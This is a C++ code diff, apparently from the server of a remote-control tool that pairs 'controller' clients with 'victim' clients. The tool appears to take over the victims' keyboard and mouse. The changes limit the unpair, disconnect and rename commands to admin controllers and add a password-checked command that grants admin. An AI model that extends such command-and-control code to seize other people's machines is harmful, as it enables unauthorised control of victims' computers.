@@ -190,33 +190,44 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		clients[clients[id].pair].socket->send(p);
 	}
 	//unpair controller from victim
-	else if (cmd == 'u') {
-		//controller is not paired
-		if (clients[id].pair == 0)
+	else if (cmd == 'u' && clients[id].isAdmin) {
+		sf::Uint16 otherId;
+		p >> otherId;
+		//other client doesn't exist
+		if (clients.find(otherId) == clients.end())
 			return;
+		//other client is not paired
+		if (clients[otherId].pair == 0 || clients[otherId].role == '-')
+			return;
+
+		sf::Uint16 vId = 0, cId = 0;
+		if (clients[otherId].role == 'c')
+			vId = clients[otherId].pair, cId = otherId;
+		if (clients[otherId].role == 'v')
+			cId = clients[otherId].pair, vId = otherId;
 
 		sf::Packet p;
 		p << sf::Uint8('u');
 		//tell controller to unpair
-		clients[id].socket->send(p);
+		clients[cId].socket->send(p);
 
 		//stop keyboard control
 		p.clear();
 		p << sf::Uint8('z');
-		clients[clients[id].pair].socket->send(p);
+		clients[vId].socket->send(p);
 		//stop mouse control
 		p.clear();
 		p << sf::Uint8('x');
-		clients[clients[id].pair].socket->send(p);
+		clients[vId].socket->send(p);
 
 		//actually unpair the 2 clients
-		clients[clients[id].pair].pair = 0;
-		clients[id].pair = 0;
+		clients[vId].pair = 0;
+		clients[cId].pair = 0;
 
 		updateControllersList();
 	}
 	//disconnect a given client
-	else if (cmd == 'e') {
+	else if (cmd == 'e' && clients[id].isAdmin) {
 		sf::Uint16 oId;
 		p >> oId;
 
@@ -235,7 +246,7 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		idsToKill.push_back(oId);
 	}
 	//rename a given client
-	else if (cmd == 'w') {
+	else if (cmd == 'w' && clients[id].isAdmin) {
 		sf::Uint16 oId;
 		std::string name;
 		p >> oId >> name;
@@ -260,6 +271,24 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		//reset controller's role and name
 		clients[id].role = '-';
 		clients[id].name = "";
+	}
+	//grant admin to client
+	else if (cmd == 'q') {
+		sf::Uint16 oId;
+		std::string pass;
+		p >> oId >> pass;
+
+		//client doesn't exist
+		if (clients.find(oId) == clients.end())
+			return;
+		//client isn't initialized
+		if (clients[oId].role != 'c')
+			return;
+
+		if (pass == PASS)
+			clients[oId].isAdmin = true;
+
+		updateControllersList();
 	}
 }
 void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
@@ -351,7 +380,7 @@ void Server::updateControllersList()
 		//load all client info
 		p.clear();
 		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
-		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair);
+		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair) << c.second.isAdmin;
 
 		//send clint info to all controllers
 		sendControllers(p);
